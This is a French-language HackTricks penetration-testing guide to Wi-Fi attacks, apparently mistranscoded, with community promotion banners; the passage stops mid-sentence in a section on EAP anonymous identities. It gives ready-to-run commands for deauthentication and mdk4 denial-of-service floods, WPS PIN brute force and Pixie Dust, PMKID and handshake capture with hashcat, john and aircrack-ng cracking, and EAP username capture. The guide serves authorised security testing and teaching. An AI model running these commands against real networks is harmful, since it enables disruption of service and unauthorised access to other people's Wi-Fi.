# Test d'intrusion Wifi

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des pirates exp√©riment√©s et des chasseurs de primes !

**Perspectives de piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs pirates d√®s aujourd'hui !

## Commandes de base Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
```
## Outils

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon est un outil tout-en-un pour les tests de s√©curit√© sans fil sur les r√©seaux Wi-Fi. Il combine de nombreuses attaques puissantes dans un seul outil, ce qui en fait un choix populaire parmi les testeurs de p√©n√©tration.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Ex√©cutez airgeddon avec docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
### wifiphisher

Il peut effectuer des attaques Evil Twin, KARMA et Known Beacons, puis utiliser un mod√®le de phishing pour parvenir √† obtenir le mot de passe r√©el du r√©seau ou capturer les identifiants des r√©seaux sociaux.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Cet outil automatise les attaques **WPS/WEP/WPA-PSK**. Il effectuera automatiquement :

* Mettre l'interface en mode monitor
* Scanner les r√©seaux possibles - Et vous permet de s√©lectionner la victime(s)
* Si WEP - Lancer des attaques WEP
* Si WPA-PSK
* Si WPS : Attaque Pixie dust et attaque par force brute (soyez prudent, l'attaque par force brute pourrait prendre beaucoup de temps). Notez qu'il ne tente pas les PIN nuls ou les PIN g√©n√©r√©s par base de donn√©es.
* Essayer de capturer le PMKID de l'AP pour le craquer
* Essayer de d√©authentifier les clients de l'AP pour capturer un handshake
* Si PMKID ou Handshake, essayer de faire une attaque par force brute en utilisant les 5000 meilleurs mots de passe.

## R√©sum√© des attaques

* **DoS**
* Paquets de d√©authentification/d√©sassociation -- D√©connecter tout le monde (ou un ESSID/Client sp√©cifique)
* Faux AP al√©atoires -- Cacher les r√©seaux, peut faire planter les scanners
* Surcharge de l'AP -- Essayer de mettre l'AP hors service (g√©n√©ralement pas tr√®s utile)
* WIDS -- Jouer avec l'IDS
* TKIP, EAPOL -- Quelques attaques sp√©cifiques pour DoS certains APs
* **Cracking**
* Cracker **WEP** (plusieurs outils et m√©thodes)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** bruteforce
* \[DoS +] Capture de **WPA handshake** + Cracking
* **WPA-MGT**
* Capture de **Nom d'utilisateur**
* **Bruteforce** des identifiants
* **Jumeau mal√©fique** (avec ou sans DoS)
* Jumeau mal√©fique **Ouvert** \[+ DoS] -- Utile pour capturer les identifiants du portail captif et/ou effectuer des attaques LAN
* Jumeau mal√©fique **WPA-PSK** -- Utile pour les attaques r√©seau si vous connaissez le mot de passe
* **WPA-MGT** -- Utile pour capturer les identifiants de l'entreprise
* **KARMA, MANA**, **Loud MANA**, **Balise connue**
* **+ Ouvert** -- Utile pour capturer les identifiants du portail captif et/ou effectuer des attaques LAN
* **+ WPA** -- Utile pour capturer les handshakes WPA

## DOS

### Paquets de D√©authentification

La mani√®re la plus courante de r√©aliser ce type d'attaque est avec des paquets de **d√©authentification**. Il s'agit d'un type de trame "de gestion" responsable de d√©connecter un appareil d'un point d'acc√®s. La falsification de ces paquets est la cl√© pour [pirater de nombreux r√©seaux Wi-Fi](https://null-byte.wonderhowto.com/how-to/wi-fi-hacking/), car vous pouvez d√©connecter de force n'importe quel client du r√©seau √† tout moment. La facilit√© avec laquelle cela peut √™tre fait est quelque peu effrayante et est souvent r√©alis√©e dans le cadre de la collecte d'un handshake WPA pour le craquage.

Outre l'utilisation momentan√©e de cette d√©connexion pour collecter un handshake √† craquer, vous pouvez √©galement laisser ces d√©auths continuer, ce qui a pour effet de bombarder le client de paquets de d√©auth provenant apparemment du r√©seau auquel il est connect√©. Comme ces trames ne sont pas chiffr√©es, de nombreux programmes exploitent les trames de gestion en les falsifiant et en les envoyant √† un ou √† tous les appareils d'un r√©seau.\
**Description provenant de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**D√©authentification en utilisant Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 signifie d√©authentification
* 1 est le nombre de d√©authentifications √† envoyer (vous pouvez en envoyer plusieurs si vous le souhaitez); 0 signifie les envoyer en continu
* \-a 00:14:6C:7E:40:80 est l'adresse MAC du point d'acc√®s
* \-c 00:0F:B5:34:30:30 est l'adresse MAC du client √† d√©authentifier; si cela est omis, une d√©authentification de diffusion est envoy√©e (ne fonctionne pas toujours)
* ath0 est le nom de l'interface

### Paquets de d√©sassociation

Les paquets de d√©sassociation sont un autre type de trame de gestion utilis√©e pour d√©connecter un n≈ìud (ce qui signifie tout appareil comme un ordinateur portable ou un t√©l√©phone portable) d'un point d'acc√®s √† proximit√©. La diff√©rence entre les trames de d√©authentification et de d√©sassociation r√©side principalement dans la mani√®re dont elles sont utilis√©es.

Un point d'acc√®s cherchant √† d√©connecter un appareil non autoris√© enverrait un paquet de d√©authentification pour informer l'appareil qu'il a √©t√© d√©connect√© du r√©seau, tandis qu'un paquet de d√©sassociation est utilis√© pour d√©connecter tous les n≈ìuds lorsque le point d'acc√®s est mis hors tension, red√©marr√© ou quitte la zone.

**Description provenant de** [**ici**](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Cette attaque peut √™tre effectu√©e par mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Plus d'attaques DOS par mdk4**

**De** [**ici**](https://en.kali.tools/?p=864)**.**

**MODE D'ATTAQUE b: Inondation de balises**

Envoie des trames de balises pour afficher de faux AP aux clients. Cela peut parfois faire planter des scanners r√©seau et m√™me des pilotes!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE D'ATTAQUE a: D√©ni de service d'authentification**

Envoie des trames d'authentification √† tous les AP trouv√©s dans la plage. Trop de clients peuvent bloquer ou r√©initialiser plusieurs AP.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE D'ATTAQUE p: Exploration et Bruteforcing de SSID**

Sonde les AP et v√©rifie les r√©ponses, utile pour v√©rifier si le SSID a √©t√© correctement d√©masqu√© et si l'AP est dans votre plage d'envoi. Le **Bruteforcing des SSID cach√©s** avec ou sans liste de mots est √©galement disponible.

**MODE D'ATTAQUE m: Exploitation des Contremesures de Michael**

Envoie des paquets al√©atoires ou r√©injecte des doublons sur une autre file QoS pour provoquer les Contremesures de Michael sur les **AP TKIP**. L'AP se mettra alors hors service pendant une minute enti√®re, ce qui en fait un **DoS** efficace.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE D'ATTAQUE e: Injection de paquets EAPOL Start et Logoff**

Inonde un point d'acc√®s avec des trames de d√©marrage **EAPOL** pour le maintenir occup√© avec des **sessions fictives** et ainsi l'emp√™cher de g√©rer des clients l√©gitimes. Ou d√©connecte les clients en **injectant des messages de d√©connexion** EAPOL **fictifs**.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE D'ATTAQUE s : Attaques pour les r√©seaux maill√©s IEEE 802.11s**

Diverses attaques sur la gestion des liens et des routages dans les r√©seaux maill√©s. Inonder les voisins et les routes, cr√©er des trous noirs et d√©tourner le trafic !

**MODE D'ATTAQUE w : Confusion WIDS**

Confondre/Abuser les Syst√®mes de D√©tection et de Pr√©vention des Intrusions en connectant les clients √† plusieurs n≈ìuds WDS ou √† de faux points d'acc√®s malveillants.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE D'ATTAQUE f: Packet Fuzzer**

Un simple packet fuzzer avec plusieurs sources de paquets et un bel ensemble de modificateurs. Soyez prudent !

### **Airggedon**

_**Airgeddon**_ propose la plupart des attaques propos√©es dans les commentaires pr√©c√©dents :

![](<../../.gitbook/assets/image (126).png>)

## WPS

WPS signifie Wi-Fi Protected Setup. Il s'agit d'une norme de s√©curit√© des r√©seaux sans fil qui tente de rendre les connexions entre un routeur et des appareils sans fil plus rapides et plus faciles. **WPS fonctionne uniquement pour les r√©seaux sans fil qui utilisent un mot de passe** crypt√© avec les protocoles de s√©curit√© **WPA** Personnel ou **WPA2** Personnel. WPS ne fonctionne pas sur les r√©seaux sans fil qui utilisent la s√©curit√© WEP obsol√®te, qui peut √™tre facilement craqu√©e par n'importe quel hacker avec un ensemble de outils et comp√©tences de base. (De [ici](https://www.digitalcitizen.life/simple-questions-what-wps-wi-fi-protected-setup))

WPS utilise un PIN de 8 chiffres pour permettre √† un utilisateur de se connecter au r√©seau, mais les 4 premiers chiffres sont d'abord v√©rifi√©s, puis les 4 suivants. Ensuite, il est possible de Brute-Force la premi√®re moiti√© puis la seconde moiti√© (seulement 11000 possibilit√©s).

### Brute Force WPS

Il existe 2 principaux outils pour effectuer cette action : Reaver et Bully.

* **Reaver** a √©t√© con√ßu pour √™tre une attaque robuste et pratique contre WPS, et a √©t√© test√© contre une grande vari√©t√© de points d'acc√®s et d'impl√©mentations WPS.
* **Bully** est une **nouvelle impl√©mentation** de l'attaque par force brute WPS, √©crite en C. Il pr√©sente plusieurs avantages par rapport au code reaver original : moins de d√©pendances, am√©lioration des performances m√©moire et CPU, gestion correcte de l'endianness et un ensemble d'options plus robuste.

Cette attaque exploite une **faiblesse dans le code PIN WPS √† huit chiffres** ; en raison de ce probl√®me, le protocole **divulgue des informations sur les quatre premiers chiffres du PIN**, et le **dernier** chiffre sert de **somme de contr√¥le**, ce qui facilite le brute forcing de l'AP WPS.\
Notez que certains appareils incluent des **protections contre les attaques par force brute**, qui **bloquent g√©n√©ralement les adresses MAC** qui tentent de mani√®re r√©p√©t√©e d'attaquer. Dans ce cas, la complexit√© de cette attaque augmente, car vous devriez **faire tourner les adresses MAC** tout en testant les PIN.

Si le code WPS valide est trouv√©, √† la fois Bully et Reaver l'utiliseront pour d√©couvrir la cl√© WPA/WPA2 PSK utilis√©e pour prot√©ger le r√©seau, vous pourrez donc vous connecter √† tout moment o√π vous en avez besoin.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Brute force intelligent**

Au lieu de commencer √† essayer chaque PIN possible, vous devriez v√©rifier s'il existe des **PINs d√©couverts pour l'AP que vous attaquez** (en fonction du MAC du fabricant) et les **PINs g√©n√©r√©s par le logiciel PIN**.

* La base de donn√©es des PINs connus est con√ßue pour les Points d'Acc√®s de certains fabricants pour lesquels il est connu qu'ils utilisent les m√™mes PINs WPS. Cette base de donn√©es contient les trois premiers octets des adresses MAC et une liste de PINs correspondants tr√®s probables pour ce fabricant.
* Il existe plusieurs algorithmes pour g√©n√©rer des PINs WPS. Par exemple, ComputePIN et EasyBox utilisent l'adresse MAC du Point d'Acc√®s dans leurs calculs. Mais l'algorithme Arcadyan n√©cessite √©galement un ID de p√©riph√©rique.

### Attaque WPS Pixie Dust

Dominique Bongard a d√©couvert que certains AP ont des moyens faibles de g√©n√©rer des **nonces** (connus sous le nom de **E-S1** et **E-S2**) qui sont cens√©s √™tre secrets. Si nous sommes capables de d√©couvrir ce que sont ces nonces, nous pouvons facilement trouver le PIN WPS d'un AP puisque l'AP doit nous le donner dans un hash pour prouver qu'il conna√Æt √©galement le PIN, et que le client ne se connecte pas √† un AP malveillant. Ces E-S1 et E-S2 sont essentiellement les "cl√©s pour d√©verrouiller la bo√Æte de verrouillage" contenant le PIN WPS. Plus d'informations ici: [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))

Essentiellement, certaines impl√©mentations ont √©chou√© dans l'utilisation de cl√©s al√©atoires pour chiffrer les 2 parties du PIN (comme il est d√©compos√© en 2 parties pendant la communication d'authentification et envoy√© au client), donc une attaque hors ligne pourrait √™tre utilis√©e pour forcer le PIN valide.
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
### Attaque de code PIN nul

Certaines impl√©mentations vraiment mauvaises autorisent la connexion avec un code PIN nul (tr√®s √©trange aussi). Reaver peut tester cela (Bully ne le peut pas).
```
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Toutes les attaques WPS propos√©es peuvent √™tre facilement effectu√©es en utilisant _**airgeddon.**_

![](<../../.gitbook/assets/image (124).png>)

* 5 et 6 vous permettent d'essayer **votre PIN personnalis√©** (si vous en avez un)
* 7 et 8 effectuent l'attaque **Pixie Dust**
* 13 vous permet de tester le **PIN NULL**
* 11 et 12 vont **r√©cup√©rer les PIN li√©s √† l'AP s√©lectionn√© √† partir des bases de donn√©es disponibles** et **g√©n√©rer** des **PIN** possibles en utilisant : ComputePIN, EasyBox et √©ventuellement Arcadyan (recommand√©, pourquoi pas ?)
* 9 et 10 testeront **chaque PIN possible**

## **WEP**

Tellement obsol√®te et disparu que je ne vais pas en parler. Sachez simplement que _**airgeddon**_ a une option WEP appel√©e "All-in-One" pour attaquer ce type de protection. Plusieurs outils offrent des options similaires.

![](<../../.gitbook/assets/image (125).png>)

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes en bugs !

**Perspicacit√© en piratage**\
Engagez-vous avec du contenu qui explore le frisson et les d√©fis du piratage

**Actualit√©s de piratage en temps r√©el**\
Restez √† jour avec le monde du piratage en √©volution rapide gr√¢ce aux actualit√©s et aux informations en temps r√©el

**Derni√®res annonces**\
Restez inform√© des derni√®res primes de bugs lanc√©es et des mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

## WPA/WPA2 PSK

### PMKID

En 2018, les auteurs de hashcat ont [r√©v√©l√©](https://hashcat.net/forum/thread-7717.html) un nouveau type d'attaque qui ne repose pas seulement **sur un seul paquet**, mais qui ne n√©cessite pas que des clients soient connect√©s √† notre AP cible, mais seulement une communication entre l'attaquant et l'AP.

Il s'av√®re que **beaucoup** de routeurs modernes ajoutent un **champ optionnel** √† la fin de la **premi√®re trame EAPOL** envoy√©e par l'AP lui-m√™me lorsque quelqu'un s'associe, le soi-disant `Robust Security Network`, qui inclut quelque chose appel√© `PMKID`

Comme expliqu√© dans le message original, le **PMKID** est d√©riv√© en utilisant des donn√©es qui nous sont connues:
```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
**√âtant donn√© que la cha√Æne "Nom PMK" est constante, nous connaissons √† la fois le BSSID de l'AP et de la station et le `PMK` est le m√™me que celui obtenu √† partir d'une poign√©e de main compl√®te en 4 √©tapes**, c'est tout ce dont hashcat a besoin pour craquer la PSK et r√©cup√©rer la phrase secr√®te!\
Description obtenue √† partir de [ici](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/).

Pour **collecter** ces informations et **forcer** localement le mot de passe, vous pouvez faire :
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Les **PMKIDs captur√©s** seront affich√©s dans la **console** et √©galement **enregistr√©s** dans \_/tmp/attack.pcap\_\
Maintenant, convertissez la capture au format **hashcat/john** et cassez-le :
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Veuillez noter que le format correct d'un hachage contient **4 parties**, comme : _4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7\*566f6461666f6e65436f6e6e6563743034383131343838_\
\_\_Si le v√¥tre ne contient **que 3 parties**, alors il est **invalide** (la capture PMKID n'√©tait pas valide).

Notez que `hcxdumptool` **capture √©galement les poign√©es de main** (quelque chose comme ceci appara√Ætra : **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Vous pouvez **transformer** les **poign√©es de main** au format **hashcat**/**john** en utilisant `cap2hccapx`.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_J'ai remarqu√© que certaines poign√©es de main captur√©es avec cet outil ne pouvaient pas √™tre craqu√©es m√™me en connaissant le mot de passe correct. Je recommanderais de capturer les poign√©es de main √©galement de mani√®re traditionnelle si possible, ou de capturer plusieurs d'entre elles en utilisant cet outil._

### Capture de poign√©e de main

Une fa√ßon d'attaquer les r√©seaux **WPA/WPA2** est de capturer une **poign√©e de main** et d'essayer de **craquer** le mot de passe utilis√© **hors ligne**. Pour ce faire, vous devez trouver le **BSSID** et le **canal** du r√©seau de la **victime**, ainsi qu'un **client** connect√© au r√©seau.\
Une fois que vous avez ces informations, vous devez commencer √† **√©couter** toutes les communications de ce **BSSID** dans ce **canal**, car la poign√©e de main sera probablement envoy√©e l√†-bas:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
Maintenant, vous devez **d√©authentifier** le **client** pendant quelques secondes afin qu'il se r√©authentifie automatiquement sur le point d'acc√®s (veuillez lire la partie sur le DoS pour trouver plusieurs fa√ßons de d√©authentifier un client) :
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, not always work
```
_Notez que lorsque le client a √©t√© d√©sauthentifi√©, il pourrait essayer de se connecter √† un autre point d'acc√®s ou, dans d'autres cas, √† un r√©seau diff√©rent._

Une fois que le `airodump-ng` affiche des informations de poign√©e de main, cela signifie que la poign√©e de main a √©t√© captur√©e et vous pouvez arr√™ter d'√©couter :

![](<../../.gitbook/assets/image (172) (1).png>)

Une fois la poign√©e de main captur√©e, vous pouvez la **cracker** avec `aircrack-ng` :
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### V√©rifier si le handshake est pr√©sent dans le fichier

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Si cet outil trouve un handshake incomplet d'un ESSID avant le complet, il ne d√©tectera pas le valide._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**Il** est important de parler des **diff√©rentes m√©thodes d'authentification** qui pourraient √™tre utilis√©es par un Wifi d'entreprise. Pour ce type de Wifi, vous trouverez probablement dans `airodump-ng` quelque chose comme ceci :
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
**EAP** (Extensible Authentication Protocol) est le **cr√¢ne** de la **communication d'authentification**, au-dessus de cela, un **algorithme d'authentification** est utilis√© par le serveur pour authentifier le **client** (**supplicant**) et dans certains cas par le client pour authentifier le serveur.\
Principaux algorithmes d'authentification utilis√©s dans ce cas :

* **EAP-GTC:** Est une m√©thode EAP pour prendre en charge l'utilisation de jetons mat√©riels et de mots de passe √† usage unique avec EAP-PEAP. Son impl√©mentation est similaire √† MSCHAPv2, mais n'utilise pas de d√©fi pair. Au lieu de cela, les mots de passe sont envoy√©s au point d'acc√®s en **texte brut** (tr√®s int√©ressant pour les attaques de r√©trogradation).
* **EAP-MD-5 (Message Digest)**: Le client envoie le hachage MD5 du mot de passe. **Non recommand√©** : Vuln√©rable aux attaques par dictionnaire, pas d'authentification du serveur et pas de moyen de g√©n√©rer des cl√©s de confidentialit√© √©quivalentes au c√¢ble (WEP) par session.
* **EAP-TLS (Transport Layer Security)**: Il repose sur des **certificats c√¥t√© client et c√¥t√© serveur** pour effectuer l'authentification et peut √™tre utilis√© pour g√©n√©rer dynamiquement des cl√©s WEP bas√©es sur l'utilisateur et la session pour s√©curiser les communications ult√©rieures.
* **EAP-TTLS (Tunneled Transport Layer Security)**: **Authentification mutuelle** du client et du r√©seau √† travers un canal (ou tunnel) chiffr√©, ainsi qu'un moyen de d√©river des cl√©s WEP dynamiques, par utilisateur et par session. Contrairement √† EAP-TLS, **EAP-TTLS ne n√©cessite que des certificats c√¥t√© serveur (le client utilisera des identifiants)**.
* **PEAP (Protected Extensible Authentication Protocol)**: PEAP est comme le protocole **EAP** mais cr√©e un **tunnel TLS** pour prot√©ger la communication. Ensuite, des protocoles d'authentification faibles peuvent √™tre utilis√©s au-dessus d'EAP car ils seront prot√©g√©s par le tunnel.
* **PEAP-MSCHAPv2**: C'est aussi connu sous le nom de **PEAP** car il est largement adopt√©. Il s'agit simplement du challenge/r√©ponse vuln√©rable appel√© MSCHAPv2 sur PEAP (il est prot√©g√© par le tunnel TLS).
* **PEAP-EAP-TLS ou simplement PEAP-TLS**: Est tr√®s similaire √† **EAP-TLS** mais un tunnel TLS est cr√©√© avant l'√©change des certificats.

Vous pouvez trouver plus d'informations sur ces m√©thodes d'authentification [ici](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) et [ici](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Capture de nom d'utilisateur

En lisant [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27), il semble que si vous utilisez **EAP**, les **messages "Identit√©"** doivent √™tre **pris en charge**, et le **nom d'utilisateur** sera envoy√© en **clair** dans les **messages "R√©ponse Identit√©"**.

M√™me en utilisant l'une des m√©thodes d'authentification les plus s√©curis√©es : **PEAP-EAP-TLS**, il est possible de **capturer le nom d'utilisateur envoy√© dans le protocole EAP**. Pour ce faire, **capturez une communication d'authentification** (d√©marrez `airodump-ng` sur un canal et `wireshark` sur la m√™me interface) et filtrez les paquets par `eapol`.\
Dans le paquet "**R√©ponse, Identit√©**", le **nom d'utilisateur** du client appara√Ætra.

![](<../../.gitbook/assets/image (150).png>)

### Identit√©s anonymes

La dissimulation de l'identit√© est prise en charge √† la fois par EAP-PEAP et EAP-TTLS. Dans le contexte d'un r√©seau WiFi, une demande d'identit√© EAP est g√©n√©ralement initi√©e par le point d'acc√®s (AP) pendant le processus d'association. Pour garantir la protection de l'anonymat de l'utilisateur, la r√©ponse du client EAP sur l'appareil de l'utilisateur ne contient que les informations essentielles requises pour que le serveur RADIUS initial traite la demande. Ce concept est illustr√© √† travers les sc√©narios suivants :

* EAP-Identit√© = anonyme

- Dans ce sc√©nario, tous les utilisateurs utilisent le pseudonyme "anonyme" comme identifiant d'utilisateur. Le serveur RADIUS initial fonctionne soit comme un serveur EAP-PEAP ou EAP-TTLS, charg√© de g√©rer le c√¥t√© serveur du protocole PEAP ou TTLS. La m√©thode d'authentification interne (prot√©g√©e) est ensuite soit g√©r√©e localement, soit d√©l√©gu√©e √† un serveur RADIUS distant (domicile).

* EAP-Identit√© = anonyme@realm_x

- Dans cette situation, les utilisateurs de diff√©rents domaines dissimulent leurs identit√©s tout en indiquant leurs domaines respectifs. Cela permet au serveur RADIUS initial de transmettre les demandes EAP-PEAP ou EAP-TTLS aux serveurs RADIUS dans leurs domaines d'origine, qui agissent en tant que serveur PEAP ou TTLS. Le serveur RADIUS initial agit uniquement en tant que n≈ìud relais RADIUS.

- Alternativement, le serveur RADIUS initial peut fonctionner en tant que serveur EAP-PEAP ou EAP-TTLS et g√©rer la m√©thode d'authentification prot√©g√©e ou la transf√©rer √† un autre serveur. Cette option facilite la configuration de politiques distinctes pour diff√©rents domaines.

En EAP-PEAP, une fois que le tunnel TLS est √©tabli entre le serveur PEAP et le client PEAP, le serveur PEAP initie une demande d'identit√© EAP et la transmet √† travers le tunnel TLS. Le client r√©pond √† cette deuxi√®me demande d'identit√© EAP en envoyant une r√©ponse d'identit√© EAP contenant la v√©ritable identit√© de l'utilisateur √† travers le tunnel chiffr√©. Cette approche emp√™che efficacement la r√©v√©lation de l'identit√© r√©elle de l'utilisateur √† toute personne √©coutant le trafic 802.11.

EAP-TTLS suit une proc√©dure l√©g√®rement diff√©rente. Avec EAP-TTLS, le client s'authentifie g√©n√©ralement en utilisant PAP ou CHAP, s√©curis√© par le tunnel TLS. Dans ce cas, le client inclut un attribut Nom d'utilisateur et soit un attribut Mot de passe, soit un attribut CHAP-Mot de passe dans le message TLS initial envoy√© apr√®s l'√©tablissement du tunnel.

Peu importe le protocole choisi, le serveur PEAP/TTLS obtient connaissance de la v√©ritable identit√© de l'utilisateur une fois que le tunnel TLS a √©t√© √©tabli. La v√©ritable identit√© peut √™tre repr√©sent√©e sous la forme utilisateur@domaine ou simplement utilisateur. Si le serveur PEAP/TTLS est √©galement responsable de l'authentification de l'utilisateur, il poss√®de d√©sormais l'identit√© de l'utilisateur et proc√®de √† la m√©thode d'authentification prot√©g√©e par le tunnel TLS. Alternativement, le serveur PEAP/TTLS peut transmettre une nouvelle demande RADIUS au serveur RADIUS d'origine de l'utilisateur. Cette nouvelle demande RADIUS exclut la couche de protocole PEAP ou TTLS. Dans les cas o√π la m√©thode d'authentification prot√©g√©e est EAP, les messages EAP internes sont transmis au serveur RADIUS d'origine sans l'enveloppe EAP-PEAP ou EAP-TTLS. L'attribut Nom d'utilisateur du message RADIUS sortant contient la v√©ritable identit√© de l'utilisateur, 